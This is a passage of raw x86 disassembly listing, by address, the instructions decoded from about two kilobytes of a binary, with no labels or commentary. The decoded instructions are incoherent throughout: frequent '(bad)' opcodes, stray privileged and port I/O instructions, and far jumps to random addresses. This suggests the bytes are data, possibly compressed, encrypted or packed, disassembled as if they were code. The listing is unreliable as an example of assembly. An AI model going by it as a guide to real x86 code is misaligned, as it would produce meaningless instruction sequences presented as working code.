  422925:	mov    DWORD PTR [ecx],edi
  422927:	mov    ds,WORD PTR [ebp-0x12448a34]
  42292d:	mov    al,0xff
  42292f:	jae    0x422987
  422931:	ret    0x5ebd
  422934:	out    dx,eax
  422935:	cmp    al,0x9d
  422937:	ins    DWORD PTR es:[edi],dx
  422938:	cs loopne 0x422992
  42293b:	push   ds
  42293c:	jg     0x422916
  42293e:	out    0x1f,al
  422940:	aam    0x11
  422942:	inc    edx
  422943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422944:	retf   0xd77d
  422947:	push   cs
  422948:	arpl   bx,sp
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	fidiv  DWORD PTR [ebp-0x47e7b1a8]
  42295c:	add    DWORD PTR [eax],eax
  42295e:	mov    BYTE PTR [esi],al
  422960:	add    BYTE PTR [eax],al
  422962:	and    esp,ebx
  422964:	add    DWORD PTR [ebx],ecx
  422966:	std    
  422967:	jmp    0xf2590441
  42296c:	mov    esi,0x58f34d71
  422971:	(bad)  
  422972:	rol    DWORD PTR [eax],cl
  422974:	je     0x422998
  422976:	dec    esp
  422977:	outs   dx,DWORD PTR ds:[esi]
  422978:	addr16 cdq 
  42297a:	fisub  WORD PTR [eax-0x62]
  42297d:	xchg   ebx,eax
  42297e:	(bad)  
  42297f:	rcl    BYTE PTR [esi+0x31],0x10
  422983:	cdq    
  422984:	cmp    edi,ebp
  422986:	dec    ebp
  422987:	cwde   
  422988:	ficom  DWORD PTR [ebx]
  42298a:	pop    DWORD PTR [edx+0x350920f5]
  422990:	pop    ebx
  422991:	fsub   QWORD PTR [edi-0xc]
  422994:	rcr    DWORD PTR [ebx],cl
  422996:	cmp    BYTE PTR [ebx+edi*1+0x28777593],al
  42299d:	(bad)  
  42299f:	push   esi
  4229a0:	xchg   ecx,eax
  4229a1:	int    0xfb
  4229a3:	out    0x65,eax
  4229a5:	sti    
  4229a6:	mov    eax,0xc81ee720
  4229ab:	clc    
  4229ac:	or     eax,0x4fb463f3
  4229b1:	pop    ss
  4229b2:	and    BYTE PTR [esi+ebx*4-0x7ece10a2],ch
  4229b9:	iret   
  4229ba:	icebp  
  4229bb:	mov    eax,ds:0xc715069
  4229c0:	nop
  4229c1:	add    BYTE PTR [edi],ah
  4229c3:	hlt    
  4229c4:	(bad)  
  4229c5:	sub    al,al
  4229c7:	adc    ebx,DWORD PTR [esi-0x41]
  4229ca:	sbb    al,0x60
  4229cc:	or     BYTE PTR [esi+0x5ee12984],0x6e
  4229d3:	repz jle 0x422973
  4229d6:	fs inc ecx
  4229d8:	ins    DWORD PTR es:[edi],dx
  4229d9:	cmp    DWORD PTR [edi-0x51],ecx
  4229dc:	fwait
  4229dd:	add    DWORD PTR [ebp-0x79],esi
  4229e0:	mov    ds:0xd39daca4,al
  4229e5:	es jle 0x422a5c
  4229e8:	jno    0x4229a6
  4229ea:	retf   
  4229eb:	test   BYTE PTR [edx],bh
  4229ed:	aaa    
  4229ee:	sub    al,0xd3
  4229f0:	dec    esp
  4229f1:	aam    0x2
  4229f3:	cmp    al,0x3c
  4229f5:	inc    edi
  4229f6:	add    al,0xeb
  4229f8:	es push es
  4229fa:	(bad)  
  4229fb:	push   cs
  4229fc:	dec    ecx
  4229fd:	dec    ebp
  4229fe:	cmc    
  4229ff:	pop    esi
  422a00:	std    
  422a01:	jl     0x4229cb
  422a03:	jp     0x4229ed
  422a05:	pop    ecx
  422a06:	push   ecx
  422a07:	sbb    eax,edx
  422a09:	cmp    DWORD PTR [ecx-0x7c],eax
  422a0c:	push   eax
  422a0d:	add    al,0x8b
  422a0f:	call   0x1d1a96cb
  422a14:	jg     0x422a30
  422a16:	inc    esp
  422a17:	jge    0x422a6a
  422a19:	pop    ds
  422a1a:	pusha  
  422a1b:	pop    ebx
  422a1c:	dec    esi
  422a1d:	rol    DWORD PTR [esi+0x6f1f1a61],0x3d
  422a24:	retf   0xe354
  422a27:	fst    QWORD PTR [edx-0x682c53c]
  422a2d:	shl    ecx,1
  422a2f:	outs   dx,DWORD PTR ds:[esi]
  422a30:	loop   0x422a39
  422a32:	inc    ecx
  422a33:	fdivr  QWORD PTR [edi]
  422a35:	scas   al,BYTE PTR es:[edi]
  422a36:	mov    cl,0x6f
  422a38:	fild   DWORD PTR [ebp+0x17]
  422a3b:	mov    dl,BYTE PTR [ebp-0x1dbdeebb]
  422a41:	sub    esi,DWORD PTR [eax+esi*1+0x7f]
  422a45:	pushf  
  422a46:	fwait
  422a47:	xor    BYTE PTR [ebx-0x70029c77],bl
  422a4d:	pop    edi
  422a4e:	or     eax,ebx
  422a50:	sub    eax,0xd5cb88bd
  422a55:	push   edx
  422a56:	into   
  422a57:	int3   
  422a58:	in     eax,0xbc
  422a5a:	cli    
  422a5b:	lods   al,BYTE PTR ds:[esi]
  422a5c:	mov    edi,0xf8b35185
  422a61:	cdq    
  422a62:	mov    ecx,0x3345a38d
  422a67:	dec    esp
  422a68:	xchg   esi,eax
  422a69:	outs   dx,DWORD PTR ds:[esi]
  422a6a:	xchg   ebx,eax
  422a6b:	jmp    0x4229ef
  422a6d:	das    
  422a6e:	pop    esi
  422a6f:	stos   DWORD PTR es:[edi],eax
  422a70:	repz sbb DWORD PTR [ebp+0x7ad6e3df],eax
  422a77:	jnp    0x422ad1
  422a79:	loop   0x422ac6
  422a7b:	popa   
  422a7c:	and    esp,DWORD PTR [edi+ecx*2]
  422a7f:	jae    0x422acf
  422a81:	sub    DWORD PTR cs:[ebx],edx
  422a84:	mov    dh,0x5e
  422a87:	cmp    BYTE PTR [ebx],0x9c
  422a8a:	repnz cmp al,bl
  422a8d:	add    ebp,DWORD PTR [ecx-0x2788aeeb]
  422a93:	adc    ebx,DWORD PTR [edi+0x3ce38923]
  422a99:	leave  
  422a9a:	mov    ah,0x5a
  422a9c:	cmp    al,0x6e
  422a9e:	jp     0x422ae1
  422aa0:	out    dx,eax
  422aa1:	cs jmp 0x51157f6b
  422aa7:	inc    ebx
  422aa8:	fstp   st(3)
  422aaa:	mov    al,ds:0xbc81f081
  422aaf:	cdq    
  422ab0:	and    al,0x14
  422ab2:	dec    ecx
  422ab3:	in     al,0x3
  422ab5:	std    
  422ab6:	xchg   BYTE PTR [edi-0x2e6ce4e7],ah
  422abc:	imul   edi,eax,0x6c7cfe5
  422ac2:	idiv   DWORD PTR [ecx]
  422ac4:	and    BYTE PTR [ecx],al
  422ac6:	comiss xmm6,DWORD PTR [edi+0x7b6824df]
  422acd:	push   esi
  422ace:	push   ebx
  422acf:	cmc    
  422ad0:	jmp    DWORD PTR [esi+0x3ddfae5a]
  422ad6:	scas   al,BYTE PTR es:[edi]
  422ad7:	inc    esi
  422ad8:	repnz enter 0x3447,0x6
  422add:	test   BYTE PTR [eax+0x55],cl
  422ae0:	(bad)  
  422ae1:	fwait
  422ae2:	pusha  
  422ae3:	icebp  
  422ae4:	frstor [eax-0x7]
  422ae7:	les    ebp,FWORD PTR [edx+0x40b2b5d4]
  422aed:	aas    
  422aee:	call   0x86810c89
  422af3:	pop    esi
  422af4:	mov    esi,gs
  422af6:	or     BYTE PTR [edi+edx*1-0x474802c0],dl
  422afd:	adc    edi,DWORD PTR [ebx]
  422aff:	jb     0x422b03
  422b01:	pop    ecx
  422b02:	pop    ebx
  422b03:	dec    ecx
  422b04:	mov    al,BYTE PTR [ecx+ebp*1+0x2ed872cf]
  422b0b:	outs   dx,BYTE PTR ds:[esi]
  422b0c:	adc    ch,bh
  422b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b0f:	add    ah,BYTE PTR [esi]
  422b11:	inc    edi
  422b12:	aam    0x2a
  422b14:	scas   al,BYTE PTR es:[edi]
  422b15:	sub    BYTE PTR [ecx-0x662394ec],bh
  422b1b:	pop    ecx
  422b1c:	inc    eax
  422b1d:	(bad)  
  422b1e:	sub    al,0xb1
  422b20:	xor    al,0x24
  422b22:	mov    ecx,0x5adf367b
  422b27:	test   al,0xb
  422b29:	and    bh,bh
  422b2b:	bound  eax,QWORD PTR [esi-0x17]
  422b2e:	test   al,0xf3
  422b30:	xchg   ebp,eax
  422b31:	mov    esi,0x1ea59c39
  422b36:	scas   al,BYTE PTR es:[edi]
  422b37:	xchg   edx,eax
  422b38:	shr    bh,cl
  422b3a:	mov    al,0x3d
  422b3c:	inc    ebp
  422b3d:	fisubr DWORD PTR [eax+eax*4+0x304fc07e]
  422b44:	in     al,dx
  422b45:	inc    edx
  422b46:	inc    edi
  422b47:	mov    al,0xdb
  422b49:	sbb    al,0x77
  422b4b:	cdq    
  422b4c:	retf   
  422b4d:	push   0x9f1ee7d2
  422b52:	sti    
  422b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b54:	ins    BYTE PTR es:[edi],dx
  422b55:	sbb    al,0x33
  422b57:	ds aad 0x51
  422b5a:	pop    esp
  422b5b:	ja     0x422b66
  422b5d:	imul   esp,esp,0x3b
  422b60:	popa   
  422b61:	dec    ebx
  422b62:	retf   
  422b63:	mov    ds:0xdbed4874,al
  422b68:	stos   DWORD PTR es:[edi],eax
  422b69:	pop    edx
  422b6a:	stos   DWORD PTR es:[edi],eax
  422b6b:	lea    esi,[edx]
  422b6d:	pop    ebx
  422b6e:	mov    ecx,gs
  422b70:	jne    0x422b29
  422b72:	test   DWORD PTR [ebp+0x7],ebx
  422b75:	std    
  422b76:	pop    ds
  422b77:	sbb    al,0xa9
  422b79:	shr    DWORD PTR [eax+ebx*1],1
  422b7c:	fsubr  QWORD PTR ds:0xd8fa27a0
  422b82:	push   esp
  422b83:	cmp    ebp,ebx
  422b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b87:	leave  
  422b88:	test   DWORD PTR [edi+0x66713595],esi
  422b8e:	jno    0x422bed
  422b90:	leave  
  422b91:	xchg   DWORD PTR [eax-0x5fb7f667],esp
  422b97:	xchg   BYTE PTR [ebx],bh
  422b99:	inc    esp
  422b9a:	xor    esp,DWORD PTR [ebx+0xab33704]
  422ba0:	mov    esp,0x394c46f9
  422ba5:	inc    eax
  422ba6:	imul   ebp,DWORD PTR [edi],0xffffffad
  422ba9:	jmp    0x9ebd:0x7b83ed2e
  422bb0:	push   es
  422bb1:	jge    0x422b7e
  422bb3:	jmp    0xfa7a:0xcfcfc9a2
  422bba:	dec    ebp
  422bbb:	es jge 0x422bb5
  422bbe:	mov    eax,0xadeb1c2
  422bc3:	mov    DWORD PTR [ecx+0x4],esp
  422bc6:	mov    ds:0x354db2e8,al
  422bcb:	dec    ebp
  422bcc:	loope  0x422b98
  422bce:	adc    DWORD PTR [esi],0x872d60fd
  422bd4:	push   ecx
  422bd5:	(bad)  
  422bd6:	cmp    bl,BYTE PTR [edx-0x1b5ffe84]
  422bdc:	mov    esp,0x1a190b90
  422be1:	in     eax,dx
  422be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422be3:	mov    ecx,0x34a0d596
  422be8:	jmp    0xbd472a3
  422bed:	bound  esi,QWORD PTR ds:0x2cb8852c
  422bf3:	scas   eax,DWORD PTR es:[edi]
  422bf4:	loop   0x422bf6
  422bf6:	pop    eax
  422bf7:	xchg   eax,ebx
  422bf9:	in     al,dx
  422bfa:	push   0xe0bcb6a3
  422bff:	loope  0x422bf7
  422c01:	shl    DWORD PTR [ecx-0x42],0x1b
  422c05:	lahf   
  422c06:	push   esp
  422c07:	sbb    bh,BYTE PTR [ebp+0x5b14345a]
  422c0d:	jns    0x422c1a
  422c0f:	fs ds pop esi
  422c12:	(bad)  
  422c13:	mov    al,0x57
  422c15:	push   esi
  422c16:	xor    dh,BYTE PTR [ecx+ecx*4+0x25]
  422c1a:	sub    al,0x59
  422c1c:	push   ss
  422c1d:	adc    eax,0x1dbd97f1
  422c22:	adc    eax,0x51b5a0a8
  422c27:	xchg   edi,eax
  422c28:	sbb    al,0x30
  422c2a:	inc    ebx
  422c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c2c:	pop    ebp
  422c2d:	dec    esp
  422c2e:	(bad)  
  422c2f:	jne    0x422c6f
  422c31:	sbb    eax,0x65ed0bfb
  422c36:	ins    DWORD PTR es:[edi],dx
  422c37:	xchg   ebp,eax
  422c38:	mov    al,0x78
  422c3a:	cmp    esp,esp
  422c3c:	ds out 0x48,eax
  422c3f:	sahf   
  422c40:	xchg   ebp,eax
  422c41:	aam    0xf
  422c43:	mov    dl,BYTE PTR [ebx+edx*4-0x36]
  422c47:	jp     0x422c0c
  422c49:	dec    ecx
  422c4a:	push   esp
  422c4b:	mov    esp,0x38bcafd8
  422c50:	jmp    0x422c8c
  422c52:	cmp    al,0xec
  422c54:	rep lods eax,DWORD PTR ds:[esi]
  422c56:	loop   0x422cbb
  422c58:	lock mov fs,WORD PTR [ebp+0x62]
  422c5c:	inc    edx
  422c5d:	loopne 0x422c97
  422c5f:	cwde   
  422c60:	ret    
  422c61:	icebp  
  422c62:	aam    0xe8
  422c64:	(bad)  
  422c65:	mov    al,ds:0x84dab288
  422c6a:	stos   DWORD PTR es:[edi],eax
  422c6b:	xchg   ebp,eax
  422c6c:	jo     0x422cd2
  422c6e:	add    al,0x63
  422c70:	adc    eax,edx
  422c72:	test   BYTE PTR [eax+0x18],bl
  422c75:	in     al,dx
  422c76:	push   ebp
  422c77:	iret   
  422c78:	mov    al,ds:0xd8f19dde
  422c7d:	loopne 0x422c98
  422c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c80:	into   
  422c81:	dec    ecx
  422c82:	(bad)
  422c86:	icebp  
  422c87:	xor    al,0x41
  422c89:	das    
  422c8a:	cmc    
  422c8b:	add    BYTE PTR ds:0x7c78dfa9,al
  422c91:	inc    ebp
  422c92:	xchg   ebp,eax
  422c93:	dec    ebp
  422c94:	jbe    0x422c38
  422c96:	push   es
  422c97:	(bad)  
  422c98:	cmc    
  422c99:	cmp    eax,eax
  422c9b:	push   0x452fb805
  422ca0:	mov    eax,0x43444203
  422ca5:	imul   BYTE PTR [edi]
  422ca7:	xchg   bh,bh
  422ca9:	shl    esp,1
  422cab:	mov    ecx,0xad4777b6
  422cb0:	ds push esp
  422cb2:	arpl   WORD PTR [esi-0x35979b0],ax
  422cb8:	inc    ebp
  422cb9:	or     eax,0x9521f24d
  422cbe:	lahf   
  422cbf:	outs   dx,DWORD PTR ds:[esi]
  422cc0:	inc    edi
  422cc1:	xor    eax,0xcf77c522
  422cc6:	add    BYTE PTR ds:0x95f8c0fa,dh
  422ccc:	shl    BYTE PTR [edx-0x80],0x66
  422cd0:	mov    al,0xfc
  422cd2:	mov    bl,BYTE PTR [ecx+edx*8+0x10cce67]
  422cd9:	inc    esi
  422cda:	xor    edx,eax
  422cdc:	ret    
  422cdd:	nop
  422cde:	push   es
  422cdf:	repz (bad) 
  422ce1:	fnsave [ebp-0x3a5ab04f]
  422ce7:	retf   
  422ce8:	fsubp  st(3),st
  422cea:	fninit 
  422cec:	test   edi,edi
  422cee:	mov    ch,ch
  422cf0:	xchg   ebp,eax
  422cf1:	clc    
  422cf2:	mov    ecx,esi
  422cf4:	fiadd  WORD PTR [ebp-0x61]
  422cf7:	sti    
  422cf8:	push   ss
  422cf9:	arpl   WORD PTR [eax+ebx*4+0x32],di
  422cfd:	or     al,dh
  422cff:	hlt    
  422d00:	lods   eax,DWORD PTR ds:[esi]
  422d01:	in     eax,0x21
  422d03:	stos   BYTE PTR es:[edi],al
  422d04:	and    eax,0xc50ea133
  422d09:	jae    0x422cf0
  422d0b:	outs   dx,DWORD PTR ds:[esi]
  422d0c:	shr    BYTE PTR [edx],0xe9
  422d0f:	sub    ah,BYTE PTR [ebp-0x42]
  422d12:	aas    
  422d13:	retf   0x32db
  422d16:	inc    edx
  422d17:	hlt    
  422d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d19:	adc    DWORD PTR [ecx-0x20],0x662a2ab1
  422d20:	jp     0x422d81
  422d22:	iret   
  422d23:	xor    dl,bh
  422d25:	add    eax,DWORD PTR [esi]
  422d27:	popf   
  422d28:	mov    DWORD PTR [ebp-0x23a54c37],esp
  422d2e:	jg     0x422cb9
  422d30:	fcomip st,st(4)
  422d32:	mov    edx,0xf12898c8
  422d37:	lea    esi,[esi]
  422d39:	loope  0x422d78
  422d3b:	xor    ecx,DWORD PTR [edi+0x1d]
  422d3e:	icebp  
  422d3f:	inc    ecx
  422d40:	lock jp 0x422d07
  422d43:	rcl    DWORD PTR [edx-0x75572718],0x52
  422d4a:	adc    BYTE PTR [esi-0x75],cl
  422d4d:	sub    DWORD PTR [ecx],esi
  422d4f:	and    ah,dh
  422d51:	sbb    eax,0x783ad39a
  422d56:	adc    ebx,esi
  422d58:	int3   
  422d59:	xchg   esi,eax
  422d5a:	ud0    ecx,DWORD PTR [edx+0x76ffac11]
  422d61:	cmp    al,al
  422d63:	addr16 xchg ebp,eax
  422d65:	and    eax,ebx
  422d67:	repz test edx,0x717049e4
  422d6e:	xor    DWORD PTR [edi+esi*8],ecx
  422d71:	xchg   ecx,eax
  422d72:	xchg   BYTE PTR [ebx+esi*2+0x52],bl
  422d76:	inc    esp
  422d77:	stc    
  422d78:	push   edi
  422d79:	mov    ds:0xd87af805,al
  422d7e:	out    dx,eax
  422d7f:	lea    esi,[ebx+0x1f]
  422d82:	leave  
  422d83:	jmp    0x33928ec5
  422d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d89:	adc    BYTE PTR [edx],ah
  422d8b:	push   edi
  422d8c:	lods   al,BYTE PTR ds:[esi]
  422d8d:	(bad)  
  422d8f:	fstp   DWORD PTR [edx]
  422d91:	xor    DWORD PTR [edi],esp
  422d93:	lds    ebx,FWORD PTR [edi-0x55]
  422d96:	push   ecx
  422d97:	repnz xor al,0x10
  422d9a:	sbb    DWORD PTR [esi+0x6c658891],edx
  422da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422da1:	popa   
  422da2:	nop
  422da3:	loope  0x422df3
  422da5:	and    edi,DWORD PTR [esi-0x46]
  422da8:	jbe    0x422e15
  422daa:	int    0x85
  422dac:	pop    edx
  422dad:	fadd   DWORD PTR [edi-0x5e]
  422db0:	mov    dl,ah
  422db2:	or     esp,DWORD PTR [ecx-0x29116de6]
  422db8:	mov    ecx,0xb18c9e11
  422dbd:	add    bl,BYTE PTR [ecx+eax*4-0x5c]
  422dc1:	jp     0x422d4a
  422dc3:	into   
  422dc4:	add    ah,BYTE PTR ds:0xe7d82932
  422dca:	leave  
  422dcb:	retf   0xd2b1
  422dce:	leave  
  422dcf:	retf   
  422dd0:	mov    BYTE PTR cs:[esi],cl
  422dd3:	push   ebp
  422dd4:	fwait
  422dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dd6:	test   DWORD PTR [ecx],esp
  422dd8:	jmp    0xc105:0x12b24a2b
  422ddf:	(bad)  
  422de0:	sbb    ch,BYTE PTR [esi-0x67]
  422de3:	icebp  
  422de4:	les    esi,FWORD PTR [edi-0x4ea4da21]
  422dea:	enter  0xf740,0x75
  422dee:	cmp    eax,DWORD PTR [ecx-0x15]
  422df1:	xlat   BYTE PTR ds:[ebx]
  422df2:	and    ecx,esp
  422df4:	jb     0x422e35
  422df6:	rcl    ah,1
  422df8:	(bad)
  422dfc:	mov    ch,0x39
  422dfe:	out    0xda,al
  422e00:	fld    TBYTE PTR [edi]
  422e02:	jno    0x422e75
  422e04:	push   edx
  422e05:	leave  
  422e06:	addr16 cwde 
  422e08:	cmp    al,0x2a
  422e0a:	pop    edx
  422e0b:	fiadd  DWORD PTR [edi]
  422e0d:	push   ds
  422e0e:	dec    ecx
  422e0f:	addr16 aaa 
  422e11:	xchg   esp,eax
  422e12:	push   ss
  422e13:	pop    ss
  422e14:	lea    ecx,[eax+0x52e201f0]
  422e1a:	cdq    
  422e1b:	loop   0x422dff
  422e1d:	fwait
  422e1e:	and    dl,BYTE PTR [ebx]
  422e20:	in     eax,0xe2
  422e22:	push   cs
  422e23:	sar    bl,0x1
  422e26:	ins    BYTE PTR es:[edi],dx
  422e27:	inc    esp
  422e28:	gs xor cl,al
  422e2b:	pop    ds
  422e2c:	pushf  
  422e2d:	div    BYTE PTR [esi-0x3d]
  422e30:	mov    WORD PTR [edi],ds
  422e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e33:	rcr    DWORD PTR [ecx],1
  422e35:	pop    es
  422e36:	mov    ebp,0xaadc1c2e
  422e3b:	mov    edi,0xbd27424f
  422e40:	sti    
  422e41:	dec    BYTE PTR [ebp-0xd1d4e33]
  422e47:	loope  0x422e62
  422e49:	lods   eax,DWORD PTR ds:[esi]
  422e4a:	test   eax,0x5a4f7ff9
  422e4f:	sahf   
  422e50:	adc    BYTE PTR [eax+0x6850eb52],0x15
  422e57:	(bad)  
  422e58:	push   ds
  422e59:	pop    esi
  422e5a:	in     al,0x66
  422e5c:	in     al,0xab
  422e5e:	retf   
  422e5f:	mov    dl,0x6b
  422e61:	aas    
  422e62:	mov    WORD PTR [eax],fs
  422e64:	mov    ds:0x65cf4463,eax
  422e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e6a:	pusha  
  422e6b:	add    DWORD PTR [ecx-0x30],ecx
  422e6e:	sbb    eax,0x324635ba
  422e73:	sbb    eax,0x6608cccc
  422e78:	call   0x3992121b
  422e7d:	adc    eax,0xb1aa1d28
  422e82:	(bad)  
  422e83:	cmp    BYTE PTR [ebx-0x2f],al
  422e86:	fs stc 
  422e88:	sbb    eax,0xbc262393
  422e8d:	dec    esp
  422e8e:	dec    esi
  422e8f:	sbb    al,cl
  422e91:	mov    ebx,0x5bf806f0
  422e96:	repnz dec eax
  422e98:	loopne 0x422e70
  422e9a:	lahf   
  422e9b:	arpl   WORD PTR [ebx+ecx*8],dx
  422e9e:	sub    esi,DWORD PTR [ebp-0x49c8a996]
  422ea4:	jae    0x422f00
  422ea6:	or     eax,0x1becb670
  422eab:	aad    0xc3
  422ead:	aam    0x4b
  422eaf:	bnd ret 0xca50
  422eb3:	enter  0x3fb8,0x5
  422eb7:	lock inc edx
  422eb9:	popa   
  422eba:	pop    ebx
  422ebb:	les    esi,FWORD PTR ds:0x64f7b287
  422ec1:	das    
  422ec2:	in     eax,dx
  422ec3:	test   DWORD PTR [ebx],edx
  422ec5:	ins    BYTE PTR es:[edi],dx
  422ec6:	push   0xc5e3cbe1
  422ecb:	mov    ?,WORD PTR [ebx-0x523740da]
  422ed1:	sbb    BYTE PTR [esi],ah
  422ed3:	dec    BYTE PTR [eax+0x6e1d9249]
  422ed9:	mov    ds:0x6bdcf4a0,al
  422ede:	iret   
  422edf:	xchg   edi,eax
  422ee0:	inc    edi
  422ee1:	xor    al,0x32
  422ee3:	xor    dh,BYTE PTR [edi+0x522db341]
  422ee9:	push   ecx
  422eea:	mov    edx,0x90289268
  422eef:	jns    0x422ea9
  422ef1:	fist   DWORD PTR [ebp-0x6f]
  422ef4:	cmp    dh,al
  422ef6:	push   edi
  422ef7:	cwde   
  422ef8:	ins    BYTE PTR es:[edi],dx
  422ef9:	rcr    ah,cl
  422efb:	in     al,dx
  422efc:	xchg   esi,eax
  422efd:	inc    edx
  422efe:	push   eax
  422eff:	scas   al,BYTE PTR es:[edi]
  422f00:	call   esp
  422f02:	push   esi
  422f03:	nop
  422f04:	lock mov DWORD PTR [esi],esp
  422f07:	adc    ebp,ebx
  422f09:	mov    ds:0xc3010df0,al
  422f0e:	xor    eax,0x22ca73a0
  422f13:	nop
  422f14:	push   cs
  422f15:	xor    ch,dl
  422f17:	pop    ebp
  422f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f19:	in     eax,0xbb
  422f1b:	push   0x42948db2
  422f20:	mov    ds:0x4b0cdf73,eax
  422f25:	cli    
  422f26:	add    dl,BYTE PTR [ebx+eiz*4-0x7c]
  422f2a:	mov    dl,ch
  422f2c:	adc    DWORD PTR [ebp+0x5],ecx
  422f2f:	dec    esi
  422f30:	cmp    edx,DWORD PTR [edx+0x1c1ac964]
  422f36:	xchg   ebx,eax
  422f37:	jmp    0x422f7b
  422f39:	daa    
  422f3a:	cmp    al,0x26
  422f3c:	scas   al,BYTE PTR es:[edi]
  422f3d:	push   ebx
  422f3e:	pop    edi
  422f3f:	jae    0x422f77
  422f41:	mov    gs,WORD PTR [esi+0x2b]
  422f44:	push   0x2d8393db
  422f49:	sub    esi,eax
  422f4b:	xchg   ebp,eax
  422f4c:	sub    BYTE PTR [esi+0x615462ed],0x41
  422f53:	stos   DWORD PTR es:[edi],eax
  422f54:	call   0x570d:0xc1adc4d9
  422f5b:	pop    ss
  422f5c:	adc    BYTE PTR [eax+0x30],0x36
  422f60:	pop    eax
  422f61:	xchg   ebp,eax
  422f62:	cmp    eax,0x1e6fd326
  422f67:	pushf  
  422f68:	add    eax,0xc40fe092
  422f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f6e:	jne    0x422f3d
  422f70:	xchg   esp,eax
  422f71:	cmp    eax,0x60ff871a
  422f76:	push   edi
  422f77:	mov    edi,eax
  422f79:	add    WORD PTR gs:[edx+0x7b],bp
  422f7e:	and    edi,DWORD PTR [ecx-0x68]
  422f81:	xor    DWORD PTR [ebp-0x27],eax
  422f84:	sbb    DWORD PTR [edi],ecx
  422f86:	aas    
  422f87:	push   ecx
  422f88:	test   al,0x84
  422f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8b:	fwait
  422f8c:	mov    eax,ss:0x84fe3bae
  422f92:	sub    DWORD PTR [edx+0x44],ecx
  422f95:	xchg   ebp,eax
  422f96:	mov    edx,ebp
  422f98:	push   esp
  422f99:	hlt    
  422f9a:	push   esp
  422f9b:	stos   DWORD PTR es:[edi],eax
  422f9c:	cmp    eax,0x50c95b21
  422fa1:	jl     0x423001
  422fa3:	or     esi,ecx
  422fa5:	dec    ebx
  422fa6:	test   edx,esi
  422fa8:	imul   BYTE PTR [esi+edx*1-0x6ca5458c]
  422faf:	xchg   ecx,eax
  422fb0:	cmp    DWORD PTR [esi],ebx
  422fb2:	mov    edx,DWORD PTR [edi]
  422fb4:	ss xchg ebp,eax
  422fb6:	pop    ss
  422fb7:	pop    ds
  422fb8:	inc    eax
  422fb9:	mov    bh,0xad
  422fbb:	or     DWORD PTR [ebx-0x2abac010],eax
  422fc1:	in     eax,dx
  422fc2:	xchg   esp,eax
  422fc3:	repnz sub eax,0x6ddf2283
  422fc9:	add    ebx,DWORD PTR [edi+eiz*8+0x16]
  422fcd:	jge    0x422fd0
  422fcf:	shl    DWORD PTR [edi],cl
  422fd1:	xor    ecx,DWORD PTR [eax+0x6b024dc8]
  422fd7:	xchg   ecx,eax
  422fd8:	fcomp  QWORD PTR [edi]
  422fda:	inc    ecx
  422fdb:	out    dx,eax
  422fdc:	jle    0x422f77
  422fde:	shl    BYTE PTR [esp+esi*2+0x1f],cl
  422fe2:	jne    0x422fed
  422fe4:	not    BYTE PTR [edx+0x5ece340e]
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422fc9
  422ff7:	add    ecx,edx
  422ff9:	jge    0x422f9b
  422ffb:	mov    esi,0x6880001
  423000:	add    BYTE PTR [eax],al
  423002:	cmp    al,0x1d
  423004:	mov    esp,0xf32297d5
  423009:	or     BYTE PTR [edx+0x8],cl
  42300c:	cdq    
  42300d:	cmp    esp,esi
  42300f:	dec    esi
  423010:	cmc    
  423011:	jne    0x42305f
  423013:	push   ecx
  423014:	xor    dl,BYTE PTR [ebp+0x72]
  423017:	ret    
  423018:	mov    bh,BYTE PTR [esi-0x7847b074]
  42301e:	jg     0x42302e
  423020:	inc    ecx
  423021:	pop    ds
  423022:	pop    ecx
  423023:	push   esp
  423024:	adc    DWORD PTR [ebx-0x11cc88b9],0xffffffe1
  42302b:	lock and al,0xbd
  42302e:	jo     0x423097
  423030:	je     0x423039
  423032:	test   eax,0x8255ee63
  423037:	pop    DWORD PTR [edx-0x2f616abe]
  42303d:	imul   ebp,eax,0xffffffc8
  423040:	lods   al,BYTE PTR ds:[esi]
  423041:	add    bl,dh
  423043:	(bad)
  423046:	sbb    BYTE PTR [esp+ebx*2-0x28],dh
  42304a:	mov    bh,0xff
  42304c:	add    eax,0xb5149472
  423051:	or     DWORD PTR [edi],edi
  423053:	test   al,bl
  423055:	call   0x92b3c8f6
  42305a:	cmp    al,0x14
  42305c:	cmp    al,0xc3
  42305e:	xor    ah,BYTE PTR [ebp-0x72]
  423061:	aas    
  423062:	jne    0x423009
  423064:	mov    esi,0xf3c4cb27
  423069:	mov    esi,0x3f14f193
  42306e:	push   0x32f76360
  423073:	call   0x25d4:0x1230257e
  42307a:	sbb    al,0x55
  42307c:	pop    esp
  42307d:	mov    al,ds:0xcf05b72c
  423082:	xor    al,0x91
  423084:	pop    es
  423085:	not    DWORD PTR [ecx+0x4e521e26]
  42308b:	lahf   
  42308c:	xchg   edi,eax
  42308d:	(bad)  
  42308f:	jmp    0x42307d
  423091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423092:	(bad)
  423095:	loop   0x4230ce
  423097:	enter  0x8d7f,0xe7
  42309b:	xor    al,0xd2
